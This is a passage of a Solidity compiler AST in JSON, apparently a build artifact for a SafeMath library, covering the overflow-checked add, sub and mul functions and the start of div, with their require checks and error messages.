							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 25,
										"nodeType": "Block",
										"src": "934:109:0",
										"statements": [
											{
												"assignments": [
													11
												],
												"declarations": [
													{
														"constant": false,
														"id": 11,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 25,
														"src": "944:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 10,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "944:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 15,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 14,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 12,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "956:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 13,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "960:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "956:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "944:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 19,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 17,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 11,
																"src": "979:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 18,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 3,
																"src": "984:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "979:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 20,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "987:29:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 16,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "971:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 21,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "971:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 22,
												"nodeType": "ExpressionStatement",
												"src": "971:46:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 23,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 11,
													"src": "1035:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 9,
												"id": 24,
												"nodeType": "Return",
												"src": "1028:8:0"
											}
										]
									},
									"documentation": "@dev Returns the addition of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `+` operator.\n     * Requirements:\n- Addition cannot overflow.",
									"id": 26,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 26,
												"src": "880:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "880:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 5,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 26,
												"src": "891:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 4,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "891:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "879:22:0"
									},
									"returnParameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 8,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 26,
												"src": "925:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 7,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "925:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "924:9:0"
									},
									"scope": 186,
									"src": "867:176:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 41,
										"nodeType": "Block",
										"src": "1374:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 36,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 28,
															"src": "1395:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 37,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 30,
															"src": "1398:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 38,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1401:32:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 35,
														"name": "sub",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															42,
															69
														],
														"referencedDeclaration": 69,
														"src": "1391:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 39,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1391:43:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 34,
												"id": 40,
												"nodeType": "Return",
												"src": "1384:50:0"
											}
										]
									},
									"documentation": "@dev Returns the subtraction of two unsigned integers, reverting on\noverflow (when the result is negative).\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n- Subtraction cannot overflow.",
									"id": 42,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 28,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 42,
												"src": "1320:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 27,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1320:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 30,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 42,
												"src": "1331:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 29,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1331:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1319:22:0"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 42,
												"src": "1365:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 32,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1365:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1364:9:0"
									},
									"scope": 186,
									"src": "1307:134:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 68,
										"nodeType": "Block",
										"src": "1820:92:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 54,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 46,
																"src": "1838:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 55,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 44,
																"src": "1843:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1838:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 57,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "1846:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 53,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "1830:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1830:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 59,
												"nodeType": "ExpressionStatement",
												"src": "1830:29:0"
											},
											{
												"assignments": [
													61
												],
												"declarations": [
													{
														"constant": false,
														"id": 61,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 68,
														"src": "1869:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 60,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1869:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 65,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 62,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 44,
														"src": "1881:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 63,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 46,
														"src": "1885:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1881:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1869:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 66,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 61,
													"src": "1904:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 52,
												"id": 67,
												"nodeType": "Return",
												"src": "1897:8:0"
											}
										]
									},
									"documentation": "@dev Returns the subtraction of two unsigned integers, reverting with custom message on\noverflow (when the result is negative).\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n- Subtraction cannot overflow.",
									"id": 69,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 44,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 69,
												"src": "1738:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 43,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1738:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 46,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 69,
												"src": "1749:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 45,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1749:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 69,
												"src": "1760:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 47,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "1760:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1737:50:0"
									},
									"returnParameters": {
										"id": 52,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 51,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 69,
												"src": "1811:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 50,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1811:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1810:9:0"
									},
									"scope": 186,
									"src": "1725:187:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 102,
										"nodeType": "Block",
										"src": "2219:392:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 80,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 78,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 71,
														"src": "2451:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 79,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2456:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2451:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 84,
												"nodeType": "IfStatement",
												"src": "2447:45:0",
												"trueBody": {
													"id": 83,
													"nodeType": "Block",
													"src": "2459:33:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2480:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 77,
															"id": 82,
															"nodeType": "Return",
															"src": "2473:8:0"
														}
													]
												}
											},
											{
												"assignments": [
													86
												],
												"declarations": [
													{
														"constant": false,
														"id": 86,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 102,
														"src": "2502:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 85,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2502:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 90,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 89,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 87,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 71,
														"src": "2514:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 88,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 73,
														"src": "2518:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2514:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2502:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 96,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 94,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 92,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 86,
																	"src": "2537:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 93,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 71,
																	"src": "2541:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "2537:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 95,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 73,
																"src": "2546:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2537:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 97,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2549:35:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 91,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "2529:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 98,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2529:56:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 99,
												"nodeType": "ExpressionStatement",
												"src": "2529:56:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 100,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 86,
													"src": "2603:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 77,
												"id": 101,
												"nodeType": "Return",
												"src": "2596:8:0"
											}
										]
									},
									"documentation": "@dev Returns the multiplication of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `*` operator.\n     * Requirements:\n- Multiplication cannot overflow.",
									"id": 103,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 74,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 71,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 103,
												"src": "2165:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2165:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 73,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 103,
												"src": "2176:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 72,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2176:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2164:22:0"
									},
									"returnParameters": {
										"id": 77,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 76,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 103,
												"src": "2210:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 75,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2210:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2209:9:0"
									},
									"scope": 186,
									"src": "2152:459:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 118,
										"nodeType": "Block",
										"src": "3133:63:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 113,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 105,
															"src": "3154:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 114,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 107,
															"src": "3157:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 115,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3160:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
